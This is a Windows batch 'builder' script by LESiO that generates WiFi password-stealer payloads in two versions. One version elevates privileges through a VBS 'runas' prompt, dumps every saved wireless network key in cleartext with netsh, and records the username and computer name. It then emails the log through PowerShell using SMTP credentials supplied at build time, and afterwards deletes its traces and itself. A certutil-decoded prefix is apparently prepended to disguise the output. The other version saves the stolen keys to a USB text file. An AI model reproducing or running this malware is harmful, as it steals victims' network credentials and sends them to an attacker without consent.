@ECHO OFF & SETLOCAL ENABLEDELAYEDEXPANSION
TITLE WiFi Evasion [BUILDER] - LESiO
MODE CON COLS=70 LINES=16
COLOR 0B
:A
    ECHO  _ _ _ _____ _____ _____    _____ _____ _____ _____ _____ _____ _____ 
    ECHO ^| ^| ^| ^|     ^|   __^|     ^|  ^|   __^|  ^|  ^|  _  ^|   __^|     ^|     ^|   ^| ^|
    ECHO ^| ^| ^| ^|-   -^|   __^|-   -^|  ^|   __^|  ^|  ^|     ^|__   ^|-   -^|  ^|  ^| ^| ^| ^|
    ECHO ^|_____^|_____^|__^|  ^|_____^|  ^|_____^|\___/^|__^|__^|_____^|_____^|_____^|_^|___^|
    ECHO WiFi Evasion By LESiO - https://github.com/FreeLesio/WiFi-Evasion     
    ECHO ----------------------------------------------------------------------
    ECHO.
    ECHO Choose Which Version Of WiFi Evasion You Want To Build.
    ECHO.
    ECHO 1) Mail Version (Requires Connection)
    ECHO 2) USB Version
    CHOICE /C 12>NUL
    IF ERRORLEVEL 2 GOTO USB
    IF ERRORLEVEL 1 GOTO MAIL
SET O="WiFi-Evasion-[MAIL.-VERSION].BAT"
SET N="WiFi-Evasion-[MAIL.-VERSION]-TEMP.BAT"
:MAIL
    CLS
    TITLE WiFi Evasion [MAIL BUILDER] - LESiO [1/5]
    ECHO  _ _ _ _____ _____ _____    _____ _____ _____ _____ _____ _____ _____ 
    ECHO ^| ^| ^| ^|     ^|   __^|     ^|  ^|   __^|  ^|  ^|  _  ^|   __^|     ^|     ^|   ^| ^|
    ECHO ^| ^| ^| ^|-   -^|   __^|-   -^|  ^|   __^|  ^|  ^|     ^|__   ^|-   -^|  ^|  ^| ^| ^| ^|
    ECHO ^|_____^|_____^|__^|  ^|_____^|  ^|_____^|\___/^|__^|__^|_____^|_____^|_____^|_^|___^|
    ECHO WiFi Evasion By LESiO - https://github.com/FreeLesio/WiFi-Evasion     
    ECHO ----------------------------------------------------------------------
    ECHO.
    SET /P MailFrom="Sender Mail : "
    TITLE WiFi Evasion [MAIL BUILDER] - LESiO [2/5]
    SET /P MailTo="Receiver Mail : "
    TITLE WiFi Evasion [MAIL BUILDER] - LESiO [3/5]
    SET /P SMTPServer="SMTP Server : "
    TITLE WiFi Evasion [MAIL BUILDER] - LESiO [4/5]
    SET /P CredUsername="SMTP Username : "
    TITLE WiFi Evasion [MAIL BUILDER] - LESiO [5/5]
    SET /P CredPassword="SMTP Password : "
    (
        ECHO @ECHO OFF ^& SETLOCAL ENABLEDELAYEDEXPANSION
        ECHO TITLE WiFi Evasion [MAIL] - LESiO
        ECHO MODE CON COLS^=18 LINES^=1
        ECHO CLS ^& COLOR 05
        ECHO IF _%%1_^=^=_SCRIPT_ GOTO :SCRIPT
        ECHO SET C^=0 
        ECHO SET L^=0 
        ECHO :UAC
        ECHO     SET UAC^=%%TEMP%%\UAC.VBS
        ECHO ^(
        ECHO     ECHO SET UAC ^= CREATEOBJECT^^^("SHELL.APPLICATION"^^^)
        ECHO     ECHO UAC.SHELLEXECUTE "%%~S0"^, "SCRIPT %%~SDP0 %%*"^, ""^, "RUNAS"^, 1
        ECHO ^)^> "%%UAC%%"
        ECHO     "%%TEMP%%\UAC.VBS"
        ECHO     DEL "%%TEMP%%\UAC.VBS"
        ECHO GOTO :EOF
        ECHO :SCRIPT
        ECHO CALL :S
        ECHO CALL :L
        ECHO SET O^=%%RANDOM%%%%RANDOM%%%%RANDOM%%
        ECHO SET O2^=%%RANDOM%%%%RANDOM%%%%RANDOM%%
        ECHO SET PASSWORDLOGS^=%%TEMP%%\%%O%%.TXT
        ECHO SET MAILSCRIPT^=%%TEMP%%\%%O2%%.PS1
        ECHO     ECHO WiFi Evasion - LESiO ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO^( ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO DATE : %%DATE%% %%TIME%% ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO USERNAME : %%USERNAME%% ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO COMPUTER : %%COMPUTERNAME%% ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO PROCESSOR ARCHITECTURE : %%PROCESSOR_ARCHITECTURE%% ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO^( ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO [N][SSID] ^=^=^=^=^^^> [PASSWORD] ^>^>%%PASSWORDLOGS%%
        ECHO     ECHO^( ^>^> %%PASSWORDLOGS%%
        ECHO FOR /F "SKIP=2 DELIMS=: TOKENS=2" %%%%A IN ^(^'NETSH WLAN SHOW PROFILES^'^) DO ^(
        ECHO     IF NOT "%%%%A"^=^="" ^(
        ECHO         SET "SSID=%%%%A"
        ECHO         SET "SSID=^!SSID:~1^!"
        ECHO         CALL :P "^!SSID^!"
        ECHO     ^)
        ECHO ^)
        ECHO TYPE %%PASSWORDLOGS%%
        ECHO FOR /F "TOKENS^=* DELIMS^=" %%%%X IN ^(%%PASSWORDLOGS%%^) DO SET BODY^=^^!BODY^^!%%%%X
        ECHO     ECHO $MailFrom ^= "%MailFrom%" ^>^> %%MAILSCRIPT%%
        ECHO     ECHO $MailTo ^= "%MailTo%" ^>^> %%MAILSCRIPT%%
        ECHO     ECHO $Subject ^= "WiFi Evasion - %%USERNAME%%" ^>^> %%MAILSCRIPT%%
        ECHO     ECHO $Body ^= "%%BODY%%" ^>^> %%MAILSCRIPT%%
        ECHO     ECHO $SMTPServer ^= "%SMTPServer%" ^>^> %%MAILSCRIPT%%
        ECHO     ECHO $SMTPClient ^= New-Object Net.Mail.SMTPClient^($SMTPServer^, 587^) ^>^> %%MAILSCRIPT%%
        ECHO     ECHO $SMTPClient.EnableSSL ^= $True ^>^> %%MAILSCRIPT%%
        ECHO     ECHO $SMTPClient.Credentials ^= New-Object System.Net.NetworkCredential^("%CredUsername%"^, "%CredPassword%"^)^; ^>^> %%MAILSCRIPT%%
        ECHO     ECHO $SMTPClient.Send^($MailFrom^, $MailTo^, $Subject^, $Body^) ^>^> %%MAILSCRIPT%%
        ECHO     START POWERSHELL.EXE -EXECUTIONPOLICY BYPASS -FILE "%%MAILSCRIPT%%"
        ECHO TIMEOUT /T 5
        ECHO DEL %%MAILSCRIPT%%
        ECHO DEL %%PASSWORDLOGS%%
        ECHO ^(GOTO^) 2^>NUL ^& DEL "%%~F0"
        ECHO :P
        ECHO SET "NAME=%%1"
        ECHO SET ^"NAME^=^^!NAME:"^=^!^"
        ECHO SET "PASSWORD="
        ECHO FOR /F "DELIMS=: TOKENS=2" %%%%A IN ^(^'NETSH WLAN SHOW PROFILES %%1 KEY^^^=CLEAR ^^^|FIND /I "CONT"^'^) DO ^(
        ECHO     SET "PASSWORD=%%%%A"
        ECHO     SET /A C+^=1
        ECHO ^)
        ECHO IF DEFINED PASSWORD ^(
        ECHO     SET PASSWORD^=^^!PASSWORD:~1^^!
        ECHO     ECHO [^^!C^^!][^^!NAME^^!] ^=^=^=^=^^^^^> [^^!PASSWORD^^!] ^>^> "%%PASSWORDLOGS%%"
        ECHO ^) ELSE ^(
        ECHO     SET /A C+^=1
        ECHO ECHO [^^!C^^!][^^!NAME^^!] EMPTY PASSWORD ^>^> "%%PASSWORDLOGS%%"
        ECHO ^)
        ECHO EXIT /B
        ECHO :S
        ECHO PROMPT $G
        ECHO FOR /F "DELIMS=." %%%%A IN ^(^'"PROMPT $H. & FOR %%%%B IN (1) DO REM"^'^) DO SET "BS=%%%%A"
        ECHO EXIT /B
        ECHO :C
        ECHO SET NL^=%%3
        ECHO IF NOT DEFINED NL ECHO REQUIRES THIRD ARGUMENT ^& PAUSE ^> NUL ^& GOTO :EOF
        ECHO IF %%3 ^=^= 0 ^(
        ECHO     ^<NUL SET /P ".=%%BS%%"^>%%2 ^& FINDSTR /V /A:%%1 /R "^$" %%2 NUL ^& DEL %%2 2^>^&1 ^& GOTO :EOF
        ECHO ^) ELSE IF %%3 ^=^= 1 ^(
        ECHO     ECHO %%BS%%^>%%2 ^& FINDSTR /V /A:%%1 /R "^$" %%2 NUL ^& DEL %%2 2^>^&1 ^& GOTO :EOF
        ECHO ^)
        ECHO EXIT /B
        ECHO :L
        ECHO FOR /F "SKIP=2 DELIMS=: TOKENS=2" %%%%A IN ^(^'NETSH WLAN SHOW PROFILES^'^) DO ^(
        ECHO     IF NOT "%%%%A"^=^="" ^(
        ECHO         SET /A L+^=1
        ECHO     ^)
        ECHO ^)
        ECHO SET /A L^=^^!L^^! + 10
        ECHO EXIT /B
    )>%O%
COPY %O% %N%
>"TEMP.~B64" ECHO(//4mY2xzDQo=
CERTUTIL.EXE -F -DECODE "TEMP.~B64" "%N%"
COPY "%N%" /B + "%O%" /B
DEL "TEMP.~B64"
DEL %O%
RENAME %N% %O%
CLS
ECHO  _ _ _ _____ _____ _____    _____ _____ _____ _____ _____ _____ _____ 
ECHO ^| ^| ^| ^|     ^|   __^|     ^|  ^|   __^|  ^|  ^|  _  ^|   __^|     ^|     ^|   ^| ^|
ECHO ^| ^| ^| ^|-   -^|   __^|-   -^|  ^|   __^|  ^|  ^|     ^|__   ^|-   -^|  ^|  ^| ^| ^| ^|
ECHO ^|_____^|_____^|__^|  ^|_____^|  ^|_____^|\___/^|__^|__^|_____^|_____^|_____^|_^|___^|
ECHO WiFi Evasion By LESiO - https://github.com/FreeLesio/WiFi-Evasion     
ECHO ----------------------------------------------------------------------
ECHO.
TITLE WiFi Evasion [MAIL BUILDER] - LESiO [OK]
COLOR 0A
ECHO File Generated Successfully ^^!
ECHO Output : WiFi-Evasion-[MAIL.-VERSION].BAT
PAUSE>NUL
GOTO :EOF
:USB
    CLS
    TITLE WiFi Evasion [USB BUILDER] - LESiO
    ECHO  _ _ _ _____ _____ _____    _____ _____ _____ _____ _____ _____ _____ 
    ECHO ^| ^| ^| ^|     ^|   __^|     ^|  ^|   __^|  ^|  ^|  _  ^|   __^|     ^|     ^|   ^| ^|
    ECHO ^| ^| ^| ^|-   -^|   __^|-   -^|  ^|   __^|  ^|  ^|     ^|__   ^|-   -^|  ^|  ^| ^| ^| ^|
    ECHO ^|_____^|_____^|__^|  ^|_____^|  ^|_____^|\___/^|__^|__^|_____^|_____^|_____^|_^|___^|
    ECHO WiFi Evasion By LESiO - https://github.com/FreeLesio/WiFi-Evasion     
    ECHO ----------------------------------------------------------------------
    ECHO.
    (
        ECHO @ECHO OFF ^& SETLOCAL ENABLEDELAYEDEXPANSION
        ECHO TITLE WiFi Evasion [USB] - LESiO
        ECHO MODE CON COLS^=18 LINES^=1
        ECHO CLS ^& COLOR 05
        ECHO IF _%%1_^=^=_SCRIPT_ GOTO :SCRIPT
        ECHO SET C^=0
        ECHO SET L^=0
        ECHO :UAC
        ECHO     SET UAC^=%%TEMP%%\UAC.VBS
        ECHO ^(
        ECHO     ECHO SET UAC ^= CREATEOBJECT^^^("SHELL.APPLICATION"^^^)
        ECHO     ECHO UAC.SHELLEXECUTE "%%~S0"^, "SCRIPT %%~SDP0 %%*"^, ""^, "RUNAS"^, 1
        ECHO ^)^> "%%UAC%%"
        ECHO     "%%TEMP%%\UAC.VBS"
        ECHO     DEL "%%TEMP%%\UAC.VBS"
        ECHO GOTO :EOF
        ECHO :SCRIPT
        ECHO CALL :S
        ECHO CALL :L
        ECHO SET PASSWORDLOGS^=WiFi-Evasion-[USB.-Version].TXT
        ECHO     ECHO WiFi Evasion [USB. VERSION] - LESiO ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO^( ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO DATE : %%DATE%% %%TIME%% ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO USERNAME : %%USERNAME%% ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO COMPUTER : %%COMPUTERNAME%% ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO PROCESSOR ARCHITECTURE : %%PROCESSOR_ARCHITECTURE%% ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO^( ^>^> %%PASSWORDLOGS%%
        ECHO     ECHO [N][SSID] ^=^=^=^=^^^> [PASSWORD] ^>^>%%PASSWORDLOGS%%
        ECHO     ECHO^( ^>^> %%PASSWORDLOGS%%
        ECHO FOR /F "SKIP=2 DELIMS=: TOKENS=2" %%%%A IN ^(^'NETSH WLAN SHOW PROFILES^'^) DO ^(
        ECHO     IF NOT "%%%%A"^=^="" ^(
        ECHO         SET "SSID=%%%%A"
        ECHO         SET "SSID=^!SSID:~1^!"
        ECHO         CALL :P "^!SSID^!"
        ECHO     ^)
        ECHO ^)
        ECHO :P
        ECHO SET "NAME=%%1"
        ECHO SET ^"NAME^=^^!NAME:"^=^!^"
        ECHO SET "PASSWORD="
        ECHO FOR /F "DELIMS=: TOKENS=2" %%%%A IN ^(^'NETSH WLAN SHOW PROFILES %%1 KEY^^^=CLEAR ^^^|FIND /I "CONT"^'^) DO ^(
        ECHO     SET "PASSWORD=%%%%A"
        ECHO     SET /A C+^=1
        ECHO ^)
        ECHO IF DEFINED PASSWORD ^(
        ECHO     SET PASSWORD^=^^!PASSWORD:~1^^!
        ECHO     ECHO [^^!C^^!][^^!NAME^^!] ^=^=^=^=^^^^^> [^^!PASSWORD^^!] ^>^> "%%PASSWORDLOGS%%"
        ECHO ^) ELSE ^(
        ECHO     SET /A C+^=1
        ECHO ECHO [^^!C^^!][^^!NAME^^!] EMPTY PASSWORD ^>^> "%%PASSWORDLOGS%%"
        ECHO ^)
        ECHO EXIT /B
        ECHO :S
        ECHO PROMPT $G
        ECHO FOR /F "DELIMS=." %%%%A IN ^(^'"PROMPT $H. & FOR %%%%B IN (1) DO REM"^'^) DO SET "BS=%%%%A"
        ECHO EXIT /B
        ECHO :C
        ECHO SET NL^=%%3
        ECHO IF NOT DEFINED NL ECHO REQUIRES THIRD ARGUMENT ^& PAUSE ^> NUL ^& GOTO :EOF
        ECHO IF %%3 ^=^= 0 ^(
        ECHO     ^<NUL SET /P ".=%%BS%%"^>%%2 ^& FINDSTR /V /A:%%1 /R "^$" %%2 NUL ^& DEL %%2 2^>^&1 ^& GOTO :EOF
        ECHO ^) ELSE IF %%3 ^=^= 1 ^(
        ECHO     ECHO %%BS%%^>%%2 ^& FINDSTR /V /A:%%1 /R "^$" %%2 NUL ^& DEL %%2 2^>^&1 ^& GOTO :EOF
        ECHO ^)
        ECHO EXIT /B
        ECHO :L
        ECHO FOR /F "SKIP=2 DELIMS=: TOKENS=2" %%%%A IN ^(^'NETSH WLAN SHOW PROFILES^'^) DO ^(
        ECHO     IF NOT "%%%%A"^=^="" ^(
        ECHO         SET /A L+^=1
        ECHO     ^)
        ECHO ^)
        ECHO SET /A L^=^^!L^^! + 10
        ECHO EXIT /B
    )>WiFi-Evasion-[USB.-VERSION].BAT
COLOR 0A
TITLE WiFi Evasion [USB BUILDER] - LESiO [OK]
ECHO File Generated Successfully ^^!
ECHO Output : WiFi-Evasion-[USB.-VERSION].BAT
PAUSE>NUL
GOTO :EOF
